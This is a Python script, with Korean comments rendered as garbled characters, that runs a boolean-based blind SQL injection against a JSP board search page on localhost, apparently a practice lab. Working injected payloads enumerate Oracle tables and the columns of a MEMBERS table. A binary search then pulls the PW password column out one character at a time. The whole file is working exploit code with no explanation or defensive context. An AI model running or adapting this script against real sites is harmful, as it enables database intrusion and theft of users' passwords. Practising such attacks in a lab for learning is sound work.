# -*- coding: cp949 -*- 
import requests
import time


url =  "http://127.0.0.1:8080/JSPProject/sql_blind/board_search.jsp"
cookie = {'JSESSIONID': '60B9FC151F976FFC0F7A268849C1D3DB'}  

#�׽�Ʈ
def test():
    param = {"searchtype":"subject","searchtext": "test%' and 1=1 --"}
    #print(param)
    req = requests.get(url, params=param)
    print(req)
    if "�˻���" not in req.text:
        print(param['searchtext'],"True")
    else:
        print(param['searchtext'],"False")

#���̺� ����
def count_table():
    count = 1
    while True:
        param = {"searchtype":"subject", "searchtext" : "test%' and (select count(table_name) from user_tables) > {} --".format(count)}
        req = requests.get(url, params=param)
        if "�˻���" not in req.text:
            count +=1
        else:
            return count
print("���̺� ����:",count_table())

#���̺� ����
def length_table():
    tablelength = 1
    while True:
        param = {"searchtype":"subject", 
                 "searchtext" : "test%' and (select length(table_name) from(SELECT ROWNUM AS RNUM, table_name FROM user_tables) WHERE RNUM=2) > {} --".format(tablelength)}
        req = requests.get(url, params = param)
        if "�˻���" not in req.text:
            tablelength +=1
        else:
            return tablelength
            

#���̺��
def find_table():
    table_num = length_table()
    table = ""
    for i in range(table_num):
        s = 1
        e = 127
        value = 64
        while True:
            param = {"searchtype":"subject",
                     "searchtext":"test%' AND ASCII(SUBSTR((SELECT table_name FROM(SELECT ROWNUM AS RNUM, table_name FROM user_tables) WHERE RNUM=2),{},1))={} --".format(i+1,value)}
            print(param)
            req = requests.get(url,params= param)
            if "�˻���" not in req.text:
                table += chr(value)
                break
            else:
                param = {"searchtype":"subject",
                         "searchtext":"test%' AND ASCII(SUBSTR((SELECT table_name FROM(SELECT ROWNUM AS RNUM, table_name FROM user_tables) WHERE RNUM=2),{},1))>{} --".format(i+1,value)}
                req = requests.get(url, params=param)
                if "�˻���" not in req.text:
                    s = value
                    value = (value + e) // 2
                else:
                    e = value
                    value = (s + value) // 2
        print("���̺� ���� : ", table)


#Į�� ����
def count_column():
    count = 1
    while True:
        param = {"searchtype":"subject", "searchtext" : "test%' AND (SELECT COUNT(column_name) FROM all_tab_columns WHERE table_name='MEMBERS')> {} --".format(count)}
        req = requests.get(url, params=param)
        if "�˻���" not in req.text:
            count +=1
        else:
            return count
print("Į�� ����:",count_column())

#Į�� ����
def length_column():
    columnlength = 1
    while True:
        param = {"searchtype":"subject", 
                 "searchtext" : "test%' and (select length(column_name) from(SELECT ROWNUM AS RNUM, column_name FROM all_tab_columns WHERE table_name='MEMBERS') WHERE RNUM=2) > {} --".format(columnlength)}
        req = requests.get(url, params = param)
        if "�˻���" not in req.text:
            columnlength +=1
        else:
            return columnlength
#print("Į�� ���̴�: ",length_column())
#length_column()

#Į����
def find_column():
    column_num = length_column()
    column = ""
    for i in range(column_num):
        s = 1
        e = 127
        value = 64
        while True:
            param = {"searchtype":"subject",
                     "searchtext":"test%' AND ASCII(SUBSTR((SELECT column_name FROM(SELECT ROWNUM AS RNUM, column_name FROM all_tab_columns WHERE table_name='MEMBERS') WHERE RNUM=2),{},1))={} --".format(i+1,value)}
            print(param)
            req = requests.get(url,params= param)
            if "�˻���" not in req.text:
                column += chr(value)
                break
            else:
                param = {"searchtype":"subject",
                         "searchtext":"test%' AND ASCII(SUBSTR((SELECT column_name FROM(SELECT ROWNUM AS RNUM, column_name FROM all_tab_columns WHERE table_name='MEMBERS') WHERE RNUM=2),{},1))>{} --".format(i+1,value)}
                req = requests.get(url, params=param)
                if "�˻���" not in req.text:
                    s = value
                    value = (value + e) // 2
                else:
                    e = value
                    value = (s + value) // 2
        print("���̺� ���� : ", column)

#������ ����
def count_data():
    count = 1
    while True:
        param = {"searchtype":"subject", "searchtext" : "test%' AND (SELECT COUNT(PW) FROM MEMBERS)> {} --".format(count)}
        req = requests.get(url, params=param)
        if "�˻���" not in req.text:
            count +=1
        else:
            return count
print("������ ����:",count_data())
count_data()

#������ ����
def length_data():
    datalength = 1
    while True:
        param = {"searchtype":"subject", 
                 "searchtext" : "test%' and (select length(PW) from(SELECT ROWNUM AS RNUM, PW FROM MEMBERS) WHERE RNUM=1) > {} --".format(datalength)}
        req = requests.get(url, params = param)
        if "�˻���" not in req.text:
            datalength +=1
            time.sleep(0.1)
            #print(datalength)
        else:
            return datalength
print("������ ����: ",length_data())
#length_data()

#�����͸�
def find_data():
    data_num = length_data()
    data = ""
    for i in range(data_num):
        s = 1
        e = 127
        value = 64
        while True:
            param = {"searchtype":"subject",
                     "searchtext":"test%' AND ASCII(SUBSTR((SELECT PW FROM (SELECT PW, ROWNUM AS RNUM FROM MEMBERS) WHERE RNUM=1),{},1))={} --".format(i+1,value)}
            print(param)
            req = requests.get(url,params= param)
            if "�˻���" not in req.text:
                data += chr(value)
                time.sleep(0.5)
                break
            else:
                param = {"searchtype":"subject",
                         "searchtext":"test%' AND ASCII(SUBSTR((SELECT PW FROM (SELECT PW, ROWNUM AS RNUM FROM MEMBERS) WHERE RNUM=1),{},1))>{} --".format(i+1,value)}
                req = requests.get(url, params=param)
                if "�˻���" not in req.text:
                    s = value
                    value = (value + e) // 2
                else:
                    e = value
                    value = (s + value) // 2
        print("��й�ȣ�� : ", data)
find_data()

